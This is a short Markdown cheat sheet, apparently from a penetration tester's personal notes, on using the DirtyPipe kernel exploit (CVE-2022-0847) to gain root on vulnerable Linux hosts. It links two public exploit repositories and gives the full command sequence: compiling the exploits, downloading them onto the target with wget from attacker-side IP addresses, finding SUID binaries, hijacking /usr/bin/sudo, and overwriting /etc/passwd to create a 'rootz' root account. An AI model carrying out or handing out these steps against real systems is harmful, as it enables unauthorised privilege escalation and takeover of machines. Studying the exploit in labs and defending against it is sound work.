# dirtypipe

### Uses

Linux

Privilege Escalation

Kernel Exploit
### Files

compile.sh

exploit-1.c

exploit-2.c

exploit-1

exploit-2
### Summary

This a privilege escalation exploit for linux based on a vulnerable linux kernel version. Should come up with a linpeas scan to see if it's vulnerable.

exploit-1.c is used to change the root password in /etc/passwd. The new password is ==piped==. Will return to original password when done.

exploit-2.c is used to overwrite data in read-only SUID processes that run as root
### Commands

Github page

[https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)


Need to have GCC installed to compile the exploit
```
sudo apt-get install gcc
```

Compile the exploit
```
chmod +x compile.sh
```
```
./compile.sh
```

Move Exploit to target machine
```
wget http://192.168.45.163:8888/exploit-1 -O exploit-1
```
```
wget http://192.168.1.102:8888/exploit-2 -O exploit-2
```

Run exploit 1
```
./exploit-1
```

Find read-only SUID binaries that run as root for exploit 2
```
find / -perm -4000 2>/dev/null
```

Run exploit 2
```
./exploit-2 /usr/bin/sudo
```

### Extra

This is another dirtypipe exploit. Precompiled in the github page as 'exp'.

Github page 2
```
https://github.com/Al1ex/CVE-2022-0847
```

Use the exploit
```
cp /etc/passwd /tmp/passwd.bak
```
```
gcc exp.c -o exp
```
```
./exp /etc/passwd 1 ootz:
```
```
su rootz
```
```
id
```
